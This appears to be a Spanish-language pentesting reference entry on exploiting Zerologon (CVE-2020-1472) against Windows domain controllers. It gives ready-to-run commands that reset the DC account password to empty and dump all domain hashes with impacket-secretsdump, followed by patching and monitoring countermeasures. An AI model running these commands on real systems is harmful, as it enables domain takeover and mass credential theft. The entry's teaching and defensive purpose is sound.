---
title: Explotación de Zerologon (CVE-2020-1472)
slug: explotacion-zerologon
aliases: [Zerologon, CVE-2020-1472, Netlogon RCE]
fase: [Explotación]
plataforma: Windows
dificultad: Intermedia
mitre: [T1210]
related: [enumeracion-kerberos, credential-dumping]
learning_refs: []
---

# Explotación de Zerologon (CVE-2020-1472)

## Descripción
Zerologon es una vulnerabilidad crítica en el protocolo Netlogon (MS-NRPC) que permite a un atacante no autenticado establecer una conexión segura con un Controlador de Dominio (DC) y restablecer la contraseña de su cuenta de computadora a un valor vacío (o conocido). El fallo reside en un uso incorrecto del vector de inicialización (IV) en el algoritmo de cifrado AES-CFB8, donde un IV compuesto solo por ceros puede provocar que el texto cifrado también sea cero en 1 de cada 256 intentos. Esto permite el bypass total de la autenticación del DC.

## Herramientas
- **zerologon_tester.py** — script para verificar si un Controlador de Dominio es vulnerable sin realizar cambios.
- **set_empty_pw.py** — exploit que restablece la contraseña de la cuenta del DC a una cadena vacía.
- **secretsdump.py** (`impacket`) — para volcar la base de datos NTDS.dit una vez se ha restablecido la contraseña.

## Comandos / Ejemplos

### Verificación de vulnerabilidad
```bash
# Probar si el DC es vulnerable (envía múltiples intentos de autenticación con ceros)
python3 zerologon_tester.py DC_NETBIOS_NAME 10.10.10.10
```

### Explotación: Restablecer contraseña del DC
```bash
# ADVERTENCIA: Este comando cambia la contraseña de la cuenta del DC en AD
python3 set_empty_pw.py DC_NETBIOS_NAME 10.10.10.10
```

### Extracción de Hashes post-explotación
```bash
# Volcar los hashes de todos los usuarios del dominio usando la contraseña vacía
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@10.10.10.10'
# El hash 31d6... corresponde a una contraseña vacía
```

## Contramedidas
- Aplicar las actualizaciones de seguridad de Microsoft de agosto de 2020 (o posteriores).
- Habilitar el modo de cumplimiento de Netlogon seguro (Secure NRPC) mediante políticas de grupo.
- Monitorear el registro de eventos de Windows para el Event ID 4742 (A computer account was changed).
- Restringir el tráfico RPC/Netlogon solo a redes de administración confiables.

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1210: Exploitation of Remote Services. https://attack.mitre.org/techniques/T1210/
